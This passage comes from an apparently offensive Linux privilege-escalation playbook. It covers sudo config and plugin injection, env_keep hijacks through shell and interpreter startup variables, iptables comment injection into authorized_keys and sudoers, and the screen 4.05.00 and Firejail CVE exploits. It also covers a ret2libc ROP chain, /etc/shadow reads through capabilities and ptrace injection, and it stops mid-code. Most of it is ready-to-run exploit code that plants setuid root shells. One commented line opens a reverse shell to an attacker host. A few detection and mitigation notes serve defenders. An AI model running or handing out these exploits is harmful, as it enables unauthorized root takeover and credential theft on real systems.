echo "sudoedit-cve2023-22809 exploited at $(date -u +%Y%m%dT%H%M%SZ)" > /root/marker-engagement-cve2023-22809-$(date +%s).txt
```

> **Detection note:** `sudo` logs the legitimate target file but NOT the EDITOR-injected file. Look for `sudoedit` invocations followed by writes to unrelated paths in auditd/auth.log.

### 4.1c Sudo + Config/Plugin/Preset Path Loading — Argument-Driven Privesc

When `sudo -l` permits a binary that accepts a **user-supplied config / plugin / module / preset / hook path** as an argument, the path itself is the attack surface. The binary parses the file as root (or the target user) and executes whatever the file format permits — script-on-rotate directives, `system()` directives, plugin entry-points, exec-on-event hooks, include directives. No GTFOBins shell escape needed; the config-file format **is** the shell escape.

This is the sudo-side counterpart to 4.4c (root-cron-consumed config). The trigger is the sudo invocation, not a scheduler — so the timing is immediate and attacker-paced.

```bash
# === DETECT — sudoers entries that accept arbitrary file path arguments ===
sudo -l 2>/dev/null
# Look for entries where the command has a path-accepting flag and ALLOWS args:
#   (root) NOPASSWD: /usr/sbin/logrotate *           # -f <conf>
#   (root) NOPASSWD: /usr/sbin/zabbix_agentd *       # -c <conf>
#   (root) NOPASSWD: /usr/sbin/apache2 *             # -f <conf>
#   (root) NOPASSWD: /usr/sbin/nginx *               # -c <conf>
#   (root) NOPASSWD: /usr/sbin/named *               # -c <conf>
#   (root) NOPASSWD: /opt/<APP>/bin/agent *          # --config <yml>
#   (root) NOPASSWD: /usr/bin/ansible-playbook *     # -i <inventory> + -e
#   (root) NOPASSWD: /usr/bin/salt-call *            # --config-dir <dir>
#   (root) NOPASSWD: /usr/bin/knife exec *           # -F <ruby file>
#   (root) NOPASSWD: /usr/bin/php *                  # -c <ini> with auto_prepend_file=
#   (root) NOPASSWD: /usr/bin/openvpn *              # --config <conf> with up <script>
#   (root) NOPASSWD: /usr/sbin/postfix *             # -c <dir>
#
# The pattern: ALLOWED binary + arg wildcard (*) + binary parses a user-pointed config.
# Even without (*), a single fixed config path that's user-writable = same primitive.
```

```bash
# === IDENTIFY THE PRIMITIVE — what does the config format let you do? ===
# For the allowed binary, find the config directives that yield code execution.
<BINARY> --help 2>&1 | grep -iE 'config|conf|plugin|module|preset|profile|include|hook|script'
man <BINARY> 2>/dev/null | grep -iE -A2 'exec|script|run|command|hook|prerotate|postrotate|on_event'

# Confirm a writable directory exists for the malicious config
ls -la /tmp /var/tmp /dev/shm 2>/dev/null
```

```bash
# === EXPLOIT — logrotate via attacker-supplied config (-f forces immediate rotation) ===
# Vulnerable line:  (root) NOPASSWD: /usr/sbin/logrotate *
# logrotate config supports prerotate/postrotate/firstaction directives → arbitrary shell as root
cat > /tmp/evil-logrotate.conf <<'EOF'
/tmp/dummy.log {
    daily
    rotate 1
    missingok
    notifempty
    firstaction
        cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
    endscript
}
EOF
touch /tmp/dummy.log
sudo /usr/sbin/logrotate -f /tmp/evil-logrotate.conf
/tmp/rootbash -p
```

```bash
# === EXPLOIT — zabbix_agentd via attacker-supplied config (UserParameter directive) ===
# Vulnerable line:  (root) NOPASSWD: /usr/sbin/zabbix_agentd *
# UserParameter is a system.run-equivalent directive evaluated at agent startup
cat > /tmp/evil-zabbix.conf <<'EOF'
Server=127.0.0.1
LogFile=/tmp/zbx.log
UserParameter=pwn,cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
sudo /usr/sbin/zabbix_agentd -c /tmp/evil-zabbix.conf -t pwn
/tmp/rootbash -p
```

```bash
# === EXPLOIT — apache2 / httpd via attacker-supplied config (mod_lua / Include) ===
# Vulnerable line:  (root) NOPASSWD: /usr/sbin/apache2 *
# Apache config can include arbitrary files; with mod_lua or CGI directives → code exec
# Simpler: point it at a config that runs a shell on startup via a wrapper
cat > /tmp/evil-apache.conf <<'EOF'
ServerRoot "/etc/apache2"
PidFile /tmp/httpd.pid
Listen 127.0.0.1:9999
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'"
EOF
sudo /usr/sbin/apache2 -f /tmp/evil-apache.conf -k start 2>/dev/null
/tmp/rootbash -p
```

```bash
# === EXPLOIT — openvpn via attacker-supplied config (up/down/script-security 2) ===
# Vulnerable line:  (root) NOPASSWD: /usr/sbin/openvpn *
# openvpn 'up' script runs as root when tunnel comes up; script-security 2 enables it
cat > /tmp/evil-ovpn.conf <<'EOF'
dev null
script-security 2
up "/bin/sh -c 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'"
EOF
sudo /usr/sbin/openvpn --config /tmp/evil-ovpn.conf 2>/dev/null &
sleep 2; /tmp/rootbash -p
```

```bash
# === EXPLOIT — php via attacker-supplied php.ini (auto_prepend_file directive) ===
# Vulnerable line:  (root) NOPASSWD: /usr/bin/php *
# auto_prepend_file forces a PHP file to be parsed before any script — controlled code-exec
cat > /tmp/pwn.php <<'EOF'
<?php system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"); ?>
EOF
cat > /tmp/evil-php.ini <<'EOF'
auto_prepend_file=/tmp/pwn.php
EOF
sudo /usr/bin/php -c /tmp/evil-php.ini -r '1;'
/tmp/rootbash -p
```

```bash
# === EXPLOIT — ansible-playbook with attacker-supplied inventory + extra-vars ===
# Vulnerable line:  (root) NOPASSWD: /usr/bin/ansible-playbook *
# Custom playbook YAML with shell module = direct root code-exec
cat > /tmp/evil-playbook.yml <<'EOF'
- hosts: localhost
  connection: local
  tasks:
    - name: pwn
      shell: cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
sudo /usr/bin/ansible-playbook /tmp/evil-playbook.yml
/tmp/rootbash -p
```

```bash
# === EXPLOIT — generic 'agent' binary with --config / --plugin-dir loading ===
# Pattern: many in-house agents and monitoring daemons load Python/Lua/Ruby plugins
# from a configurable directory. If sudoers permits the agent and an arg, drop the
# plugin in a writable dir and point the agent at it.
mkdir -p /tmp/evil-plugins
cat > /tmp/evil-plugins/pwn.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
cat > /tmp/evil-agent.yml <<'EOF'
plugin_dir: /tmp/evil-plugins
load_on_start: true
EOF
sudo /opt/<APP>/bin/agent --config /tmp/evil-agent.yml
/tmp/rootbash -p
```

```bash
# === MARKER (proof-of-access at root) ===
echo "sudo-config-driven privesc by <USER> at $(date -u +%Y%m%dT%H%M%SZ)" \
  | sudo tee /root/marker-engagement-sudoconfig-$(date +%s).txt >/dev/null
sudo ls -la /root/marker-engagement-sudoconfig-*.txt
```

> **Tip:** The triage question is *what does the binary do with a path argument?* If the path is parsed as a config / plugin manifest / preset / hook script, the format's directive set is your code-exec primitive. Look for: `prerotate` / `postrotate` (logrotate), `UserParameter` / `system.run` (zabbix), `up` / `down` / `route-up` (openvpn), `auto_prepend_file` / `extension=` (php), `IncludeFile` / `ErrorLog "|cmd"` (apache), shell modules / `lookup pipe` (ansible), `runner_dirs` / `module_dirs` (salt), `core.sshCommand` / `include.path` (git -c). When in doubt, grep the binary's man page and config docs for `exec|script|run|command|hook|prerotate|on_*|module_dir|plugin_dir`. Distinct from 4.4c (which is the same primitive driven by root cron/systemd, not by an attacker-paced sudo invocation).

### 4.1d Generic env_keep Config-Path Hijack — Beyond LD_PRELOAD

`sudo -l` shows `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH` are the textbook cases — but **any** preserved env var that steers config / startup-file lookup is the same primitive. If the env var points at a path you can write to, and the sudoed binary sources / `import`s / `require`s that path as root, you get code-as-root. Generalize: dynamic loader vars are one family; shell init, language interpreter init, app-specific `*_CONFIG` / `*_RC` / `XDG_*` are the others.

```bash
# === STEP 1: ENUMERATE env_keep — every preserved var is a candidate ===
sudo -l
# Look for any of these patterns under "env_keep":
#   env_keep+="LD_PRELOAD LD_LIBRARY_PATH"      # classic dynamic loader (see 4.1)
#   env_keep+="BASH_ENV ENV"                    # bash/sh non-interactive startup file
#   env_keep+="PYTHONSTARTUP PYTHONPATH"        # python interactive / import path
#   env_keep+="PERL5OPT PERL5LIB PERLLIB"       # perl
#   env_keep+="RUBYOPT RUBYLIB"                 # ruby
#   env_keep+="NODE_OPTIONS NODE_PATH"          # node — --require <path>, --import <path>
#   env_keep+="XDG_CONFIG_HOME XDG_DATA_HOME"   # any xdg-aware app reads $XDG_CONFIG_HOME/<app>/config
#   env_keep+="<APP>_CONFIG <APP>_RC"           # app-specific (e.g. CURLRC, GITCONFIG, ANSIBLE_CONFIG, AWS_CONFIG_FILE, KUBECONFIG, PSQL_HISTORY, MYSQL_HISTFILE, IRBRC)
#   env_keep+="HOME"                            # HOME redirect → ~/.bashrc, ~/.profile, ~/.config/<app>/* sourced from your dir
```

```bash
# === STEP 2: MATCH var → consumer in the sudoed binary ===

# What does the sudoed binary actually read at startup? Pick one:
strace -f -e openat -o /tmp/strace.out sudo <ALLOWED_BINARY> 2>/dev/null
grep -E "config|rc$|startup|profile|\.py$|\.js$|\.rb$" /tmp/strace.out | head -40
# OR examine the binary for getenv() calls:
strings <ALLOWED_BINARY> | grep -E "^(XDG_|.*_CONFIG$|.*_RC$|.*PATH$|HOME$|BASH_ENV$|PYTHONSTARTUP$|NODE_OPTIONS$)"
ltrace -e getenv sudo <ALLOWED_BINARY> 2>&1 | head -40
```

```bash
# === STEP 3: PLANT THE MALICIOUS CONFIG IN A WRITABLE PATH ===

# --- Family A: shell startup (BASH_ENV / ENV) ---
# bash sources $BASH_ENV when invoked non-interactively (script, -c). If the sudoed
# binary shells out, BASH_ENV fires.
cat > /tmp/pwn.sh <<'EOF'
chown root:root /tmp/rootbash 2>/dev/null
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
sudo BASH_ENV=/tmp/pwn.sh <ALLOWED_BINARY_THAT_SPAWNS_SHELL>
/tmp/rootbash -p

# --- Family B: python startup ---
# PYTHONSTARTUP is read by interactive python; PYTHONPATH puts your dir first on import.
cat > /tmp/pwn.py <<'EOF'
import os; os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
sudo PYTHONSTARTUP=/tmp/pwn.py <ALLOWED_PYTHON_BINARY>
# OR: name the file to shadow a stdlib module the script imports
mkdir -p /tmp/evil && cp /tmp/pwn.py /tmp/evil/<MODULE_NAME>.py
sudo PYTHONPATH=/tmp/evil <ALLOWED_PYTHON_BINARY>

# --- Family C: node ---
# NODE_OPTIONS=--require <path> loads arbitrary JS at startup of any node invocation.
cat > /tmp/pwn.js <<'EOF'
require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash');
EOF
sudo NODE_OPTIONS="--require /tmp/pwn.js" <ALLOWED_NODE_BINARY>

# --- Family D: perl / ruby ---
# perl -M<module> equivalent via PERL5OPT; Ruby's RUBYOPT honors -r<lib>.
cat > /tmp/Pwn.pm <<'EOF'
package Pwn; system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"); 1;
EOF
sudo PERL5LIB=/tmp PERL5OPT="-MPwn" <ALLOWED_PERL_BINARY>

cat > /tmp/pwn.rb <<'EOF'
system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
sudo RUBYOPT="-r/tmp/pwn" <ALLOWED_RUBY_BINARY>

# --- Family E: XDG / app-specific *_CONFIG / *_RC ---
# Any XDG-aware tool: $XDG_CONFIG_HOME/<app>/config takes precedence over /etc/<app>.
mkdir -p /tmp/xdg/<APP_NAME>
# craft <APP_NAME>'s config in /tmp/xdg/<APP_NAME>/config such that it triggers code:
#   - curl: --exec equivalents via output= pointing at root-writable target
#   - git:  [core] hooksPath = /tmp/hooks  → place pre-commit shell script
#   - ansible: ANSIBLE_CONFIG → [defaults] roles_path with malicious roles
#   - aws:  AWS_CONFIG_FILE  → credential_process = /tmp/pwn.sh
#   - kube: KUBECONFIG       → exec.command = /tmp/pwn.sh
sudo XDG_CONFIG_HOME=/tmp/xdg <ALLOWED_BINARY>

# --- Family F: HOME redirect (covers everything dotfile-based) ---
# If HOME is preserved, every ~-relative lookup hits your dir: ~/.bashrc, ~/.profile,
# ~/.gitconfig, ~/.netrc, ~/.curlrc, ~/.my.cnf, ~/.psqlrc, ~/.config/<app>/*
mkdir -p /tmp/fakehome
cat > /tmp/fakehome/.bashrc <<'EOF'
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
cat > /tmp/fakehome/.curlrc <<'EOF'
output = "/etc/sudoers.d/pwn"
EOF
sudo HOME=/tmp/fakehome <ALLOWED_BINARY_THAT_READS_DOTFILES>
```

```bash
# === STEP 4: DETONATE + COLLECT ROOT ===
ls -la /tmp/rootbash             # confirm uid=0 + setuid bit
/tmp/rootbash -p                 # -p preserves euid=0
id                               # uid=0(root)

# Marker (proof-of-access — ADDITIVE, not destructive):
echo "env_keep $(date -u +%Y%m%dT%H%M%SZ) via <ENV_VAR>" > /root/marker-engagement-envkeep-$(date +%s).txt
ls -la /root/marker-engagement-envkeep-*.txt
```

> **Generalization:** the LD_PRELOAD/LD_LIBRARY_PATH cases are just the dynamic-loader family. The same primitive (env_keep + writable path the var resolves to + root-side parser) applies to **shell startup** (BASH_ENV, ENV), **interpreter startup** (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS), **import/library paths** (PYTHONPATH, PERL5LIB, RUBYLIB, NODE_PATH), **XDG / HOME redirects** (XDG_CONFIG_HOME, HOME), and any **app-specific** `*_CONFIG` / `*_RC` / `*_PROFILE` (CURLRC, GITCONFIG, ANSIBLE_CONFIG, AWS_CONFIG_FILE, KUBECONFIG, IRBRC). Every preserved var that resolves to a parsed path is the same bug.

> **SETENV vs env_keep:** The sudoers `SETENV` tag is a *distinct mechanism* from `env_keep`. `env_keep` preserves specific variables globally; `SETENV` appears per-command in `sudo -l` output as `(ALL) SETENV: NOPASSWD: /usr/bin/python3 *` and lets the invoker pass **any** environment variable to that specific command. If you see `SETENV:` in `sudo -l`, every env-based hijack above works without needing the var in `env_keep`. Identify with:

```bash
# Detect SETENV tag in sudo -l output
sudo -l 2>/dev/null | grep -i "SETENV"
# Example output: (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/app/run.py
# The SETENV tag means you can inject ANY env var — PYTHONPATH, LD_PRELOAD, etc.

# Exploit — same payloads as env_keep section above, but specify vars inline:
mkdir -p /tmp/evil && echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' > /tmp/evil/os.py
sudo PYTHONPATH=/tmp/evil /usr/bin/python3 /opt/app/run.py
/tmp/rootbash -p

# LD_PRELOAD via SETENV (if binary is dynamically linked):
sudo LD_PRELOAD=/tmp/libhax.so /usr/bin/python3 /opt/app/run.py
```

### 4.1e iptables --comment Newline Injection + iptables-save Arbitrary File Write

When `sudo -l` allows `iptables` and/or `iptables-save`, the `--comment` field accepts newline-escaped content. Combined with `iptables-save -f <PATH>`, this writes attacker-controlled text to any root-writable file (SSH authorized_keys, sudoers drop-in, cron).

```bash
# Detect — sudo permits iptables commands
sudo -l
# Look for: (root) NOPASSWD: /usr/sbin/iptables *
#           (root) NOPASSWD: /usr/sbin/iptables-save *

# Step 1: Inject SSH pubkey via --comment with embedded newlines
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_PUBKEY>\n'

# Step 2: Write the rules file (contains the comment with your key) to authorized_keys
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys

# Step 3: Connect as root
ssh -i <PRIVATE_KEY> root@<TARGET>
```

```bash
# Alternative: write a sudoers drop-in for persistent NOPASSWD
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<USER> ALL=(ALL) NOPASSWD: ALL\n'
sudo /usr/sbin/iptables-save -f /etc/sudoers.d/pwn
sudo /bin/bash
```

#### Living-off-the-land / LOTL variant

```bash
# Pure iptables + iptables-save (both ship with netfilter-persistent / iptables package)
# No external tools needed — the above IS the LOTL approach
# If iptables-save is not in sudo, but iptables -j LOG is allowed:
# redirect via LOG + syslog rule (less reliable, requires syslog config control)
```

### 4.2 SUID / SGID Abuse
```bash
find / -perm -4000 -type f 2>/dev/null
```
Cross-reference with [GTFOBins](https://gtfobins.github.io/) (filter by SUID).

```bash
# Custom SUID binary — check what it executes
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary

# Shared library injection for SUID binaries
# If binary loads a .so from a writable path:
ldd /path/to/suid_binary
# Compile malicious .so and place in writable path
```

### 4.2b SUID capsh — Capability-Aware Shell Escape

When `capsh` is SUID-root (or has `cap_setuid+ep`), it can drop directly to a root shell by setting uid/gid to 0. GTFOBins lists this but the exact invocation depends on capsh version.

```bash
# Detect SUID capsh
find / -name "capsh" -perm -4000 2>/dev/null
ls -la /usr/sbin/capsh

# Exploit — drop to root shell
/usr/sbin/capsh --gid=0 --uid=0 --
# Returns: root shell (uid=0 gid=0)

# If capsh lacks --uid/--gid flags (older version), use --caps then exec
/usr/sbin/capsh --caps="cap_setuid+ep" -- -c 'exec /bin/bash -p'
```

#### Living-off-the-land / LOTL variant

```bash
# capsh IS a native tool (part of libcap2-bin); no download needed
# The above commands are already LOTL — capsh ships with standard installs
```

### 4.2c SUID GNU Screen 4.05.00 — CVE-2017-5618

GNU screen 4.05.00 SUID binary allows writing to `/etc/ld.so.preload` via a crafted shared library, yielding root on any subsequent SUID binary execution. Affects screen exactly version 4.05.00.

```bash
# Detect — confirm SUID screen at vulnerable version
ls -la /usr/bin/screen-4.5.0 /usr/bin/screen 2>/dev/null
screen --version 2>/dev/null
# Vulnerable: Screen version 4.05.00

# Step 1: Create a shared library that spawns root shell
cat > /tmp/libhax.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void) {
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

# Step 2: Create the root shell binary
cat > /tmp/rootshell.c <<'EOF'
#include <stdio.h>
int main(void) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    execvp("/bin/sh", NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c

# Step 3: Exploit — screen creates /etc/ld.so.preload pointing to our lib
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
# ld.so.preload now contains /tmp/libhax.so

# Step 4: Trigger the preload (any SUID binary loads it)
/usr/bin/su --help 2>/dev/null
# libhax constructor fires: chowns /tmp/rootshell to root + sets SUID

# Step 5: Root shell
/tmp/rootshell
id
```

#### Living-off-the-land / LOTL variant

```bash
# The exploit itself uses only gcc + screen (both present on the target)
# If gcc is unavailable, cross-compile libhax.so and rootshell on attacker, transfer
# Minimum needed on target: SUID screen 4.05.00 + ability to write /tmp
```

### 4.2d GDB / PEDA — Recover Hardcoded Password from SUID Binary

When a custom SUID binary compares user input against a hardcoded password (via `strcmp`, `strncmp`, `memcmp`), break on the comparison function and read the expected value from registers/stack. Faster than reversing the binary statically.

```bash
# Triage — confirm it's a custom SUID that prompts for a password
ls -la <SUID_BINARY>
strings <SUID_BINARY> | grep -iE 'pass|enter|auth|secret|key'
ltrace <SUID_BINARY> 2>&1 | grep -iE 'strcmp|strncmp|memcmp'
# ltrace output reveals: strcmp("user_input", "s3cr3tP@ss") = ... → immediate win
```

```bash
# If ltrace doesn't show it (static binary, or stripped), use gdb
gdb -q <SUID_BINARY>
# Set breakpoint on comparison functions
(gdb) break strcmp
(gdb) break strncmp
(gdb) break memcmp
(gdb) run

# When breakpoint hits, examine arguments (x86_64 calling convention: rdi=arg1, rsi=arg2)
(gdb) x/s $rdi
(gdb) x/s $rsi
# One of these is the hardcoded password, the other is your input

# For 32-bit (i386): arguments on stack
(gdb) x/s *(char**)($esp+4)
(gdb) x/s *(char**)($esp+8)

# Continue to find multiple comparisons
(gdb) continue
```

```bash
# PEDA/GEF enhanced workflow (auto-prints args on break)
gdb -q <SUID_BINARY>
# With PEDA loaded, context shows args automatically
(gdb) break strcmp
(gdb) run <<< "AAAA"
# PEDA prints: Arg[0] = "AAAA"  Arg[1] = "actual_password_here"

# Extract and use the password
echo "<RECOVERED_PASSWORD>" | <SUID_BINARY>
```

#### Living-off-the-land / LOTL variant

```bash
# ltrace is the fastest LOTL approach (ships with most distros)
ltrace <SUID_BINARY> <<< "test" 2>&1 | grep -i 'strcmp\|strncmp\|memcmp'
# If ltrace unavailable, strace can reveal via read() buffers but less direct
strace -e trace=read,write -s 200 <SUID_BINARY> <<< "test" 2>&1 | grep -i pass
# strings remains the baseline (no execution needed)
strings <SUID_BINARY> | less
```

### 4.2e Custom SUID Binary — ret2libc / ROP Exploitation

When a SUID-root binary reads user input into a fixed stack buffer with NX enabled, ret2libc / ROP via libc offsets is the path to root.

```bash
# Triage the binary — confirm SUID-root, check protections
ls -la <APP_PATH>                              # -rwsr-xr-x root root → SUID-root
file <APP_PATH>                                # ELF class, dynamic vs static
checksec --file=<APP_PATH>                     # NX, PIE, RELRO, Canary, ASLR posture
strings <APP_PATH> | grep -Ei 'gets|strcpy|sprintf|read|system|/bin/sh'
ldd <APP_PATH>                                 # libc path + base (only meaningful if ASLR is off)
cat /proc/sys/kernel/randomize_va_space        # 0=off, 1=conservative, 2=full
```

Find the saved-RIP offset with a cyclic pattern.

```bash
# Generate cyclic, send, read crash RIP, compute offset
msf-pattern_create -l 200 > /tmp/pat.txt
gdb -q <APP_PATH> -ex 'run < /tmp/pat.txt' -ex 'info registers rip' -ex quit
msf-pattern_offset -q <RIP_VALUE>              # → offset to saved RIP
```

If ASLR is on, leak a libc address first (puts/printf via PLT/GOT), recover libc base, then build the ROP chain.

```python
# pwntools skeleton — leak libc, return to main, send second-stage ROP
from pwn import *

context.binary = ELF('<APP_PATH>')
elf  = context.binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')   # match target libc

OFFSET = 0  # set from msf-pattern_offset

POP_RDI = 0x0  # ROPgadget --binary <APP_PATH> | grep 'pop rdi ; ret'
RET     = 0x0  # any clean 'ret' for stack alignment on x86_64

io = process(elf.path)                          # or remote('<TARGET>', <PORT>) if exposed
# Stage 1: leak libc via puts(puts@got) → return to main
chain  = b'A' * OFFSET
chain += p64(POP_RDI) + p64(elf.got['puts'])
chain += p64(elf.plt['puts'])
chain += p64(elf.symbols['main'])
io.sendline(chain)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Stage 2: system("/bin/sh") via libc — note SUID drops privs unless setuid(0) first
bin_sh = next(libc.search(b'/bin/sh\x00'))
chain2  = b'A' * OFFSET
chain2 += p64(RET)                              # 16-byte stack alignment for movaps
chain2 += p64(POP_RDI) + p64(0)
chain2 += p64(libc.symbols['setuid'])           # restore euid=0 under SUID
chain2 += p64(POP_RDI) + p64(bin_sh)
chain2 += p64(libc.symbols['system'])
io.sendline(chain2)
io.interactive()
```

Hunt gadgets and one-shot exec primitives.

```bash
# Gadget discovery
ROPgadget --binary <APP_PATH> --only 'pop|ret' | grep -E 'pop rdi|pop rsi|pop rdx'
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'pop|ret' | head
ropper --file <APP_PATH> --search 'pop rdi'

# one_gadget — single-call execve("/bin/sh") if constraints are met
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Verify required register/memory constraints at the call site before using
```

If ASLR is off (`randomize_va_space=0`) skip the leak — pull libc base from `ldd` once and hardcode offsets.

```bash
# Static libc base when ASLR is off
ldd <APP_PATH> | awk '/libc/ {print $3, $4}'
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E ' system$| setuid$| execve$'
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

Post-exploit shell — pin the privilege via additive marker only (no destructive writes).

```bash
# Inside the spawned root shell — proof-of-access (additive)
id > /root/marker-engagement-suid-rop-$(date +%s).txt
ls -la /root/marker-engagement-suid-rop-*.txt
# Optional callback if interactive shell isn't viable
# bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'
```

> **Tip:** Some libc builds require `setuid(0)` before `system("/bin/sh")` because bash drops privileges when euid != ruid. Always include the setuid gadget in the SUID-root chain.

> **Tip:** On x86_64, `system()` calls `movaps` on stack-aligned data — insert an extra `ret` gadget before the `system` call

### 4.2f Firejail `--join` User-Namespace LPE — CVE-2022-31214

**Two-Shell Race Against `/proc/<PID>/uid_map` During Namespace Setup → Root in Initial NS**
Affects Firejail ≤ 0.9.68. SUID `firejail` binary mishandles user-namespace creation when joining its own sandbox: shell 1 starts `firejail --join=<own-pid>`, shell 2 races writes to the target's `uid_map` while the namespace is being set up, ending with uid 0 in the **initial** (host) namespace — not the sandbox.

```bash
# Discovery — check for SUID firejail
which firejail
ls -la "$(which firejail)" 2>/dev/null    # SUID-root expected
firejail --version 2>/dev/null | head -2  # vulnerable: <= 0.9.68

# Confirm user namespaces enabled (required)
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null   # expect 1
sysctl -n user.max_user_namespaces 2>/dev/null               # expect > 0

# Exploitation — public PoC: github.com/MaherAzzouzi/CVE-2022-31214-Firejail-LPE
# Core idea (manual, two-shell race):
# Shell 1 — start a sandbox we will join, then join it on our own PID
firejail --noprofile &
SANDBOX_PID=$!
firejail --join=$SANDBOX_PID

# Shell 2 — race the namespace setup by writing uid_map before firejail finishes
# Loop until the window hits; exit on first uid=0 in initial namespace
while :; do
  echo "0 0 1" > /proc/$SANDBOX_PID/uid_map 2>/dev/null
  echo "0 0 1" > /proc/$SANDBOX_PID/gid_map 2>/dev/null
done

# When shell 1 returns a prompt, confirm root in the host namespace (NOT the sandbox)
id                                      # uid=0(root)
readlink /proc/$$/ns/user               # compare against /proc/1/ns/user — same = host ns
ls -la /root/                           # access proves initial-ns root
cat /etc/shadow | head -1               # read-only proof; do NOT modify (persistence vector)

# Marker (additive proof — see proof-of-access rules)
TS=$(date +%s)
echo "marker-<USER>-<ENGAGEMENT_ID>-$TS" > /root/marker-<USER>-$TS.txt
ls -la /root/marker-<USER>-$TS.txt

# Mitigation — upgrade firejail to >= 0.9.70, or remove the SUID bit if not needed
# chmod u-s $(which firejail)
```

> **Detection note (Purple Team):** monitor `write()` syscalls to `/proc/<pid>/uid_map` and `/proc/<pid>/gid_map` from non-matching uids, especially when the target PID is a SUID `firejail` process mid-setup. Look for short-lived `firejail --join=<self-pid>` patterns paired with tight loops on `uid_map` from a sibling shell.

### 4.3 Capabilities Abuse
```bash
getcap -r / 2>/dev/null
```

| Capability | Exploitation |
|---|---|
| `cap_setuid+ep` | Binary can set UID → spawn root shell |
| `cap_dac_read_search` | Read any file (e.g., `/etc/shadow`) |
| `cap_net_raw` | Packet sniffing |
| `cap_sys_admin` | Mount filesystems |
| `cap_net_bind_service` | Bind to privileged ports |

```bash
# Python with cap_setuid
/usr/bin/python3.x -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

### 4.3b cap_dac_read_search — Arbitrary File Read via Capable Binaries

When a binary has `cap_dac_read_search+ep`, it bypasses filesystem read permission checks entirely. Any file on the system (including `/etc/shadow`, SSH keys, databases) is readable through that binary regardless of ownership/mode.

```bash
# Detect binaries with cap_dac_read_search
getcap -r / 2>/dev/null | grep dac_read_search
# Example output: /usr/bin/tac = cap_dac_read_search+ep

# Exploit — read /etc/shadow (proves arbitrary file read)
/usr/bin/tac /etc/shadow
/usr/bin/cat /etc/shadow
/usr/bin/head -n 5 /etc/shadow
/usr/bin/less /etc/shadow
/usr/bin/xxd /etc/shadow | head -50
/usr/bin/base64 /etc/shadow | base64 -d

# Read root SSH private key
/usr/bin/tac /root/.ssh/id_rsa | tac

# Read any config with credentials
/usr/bin/cat /etc/openvpn/auth.txt
/usr/bin/cat /var/lib/mysql/mysql.cnf
```

```bash
# If the capable binary is 'tar' or 'zip' — archive then extract
/usr/bin/tar czf /tmp/shadow.tgz /etc/shadow 2>/dev/null && tar xzf /tmp/shadow.tgz -C /tmp/
cat /tmp/etc/shadow
```

#### Living-off-the-land / LOTL variant

```bash
# The exploit IS LOTL — the capable binary (cat/tac/head/less/xxd/base64) is a system tool
# No downloads needed; the capability on the binary is the entire attack surface
# Crack the extracted shadow hashes offline:
# john --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash
# hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt
```

### 4.3c CAP_SYS_PTRACE — GDB Attach + Shellcode Injection into Root Process

When a binary has `cap_sys_ptrace+ep` (or the current user has it via ambient capabilities), you can attach to any running process (including root-owned) and inject shellcode or call `system()` directly in its memory space.

```bash
# Detect
getcap -r / 2>/dev/null | grep sys_ptrace
# Or check if python3/gdb has it:
# /usr/bin/python3.x = cap_sys_ptrace+ep

# Find a root-owned process to attach to (pick a long-running one)
ps -ef | grep -E "^root" | grep -v "\[" | head -20
# Good targets: apache2, nginx, sshd, cron, mysqld — stable, won't crash on inject
```

```bash
# Method 1: Python with cap_sys_ptrace — inject via ctypes/ptrace
/usr/bin/python3.x -c '
import ctypes, sys, struct

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7

libc = ctypes.CDLL("libc.so.6")
pid = int(sys.argv[1])

# Attach to root process
libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
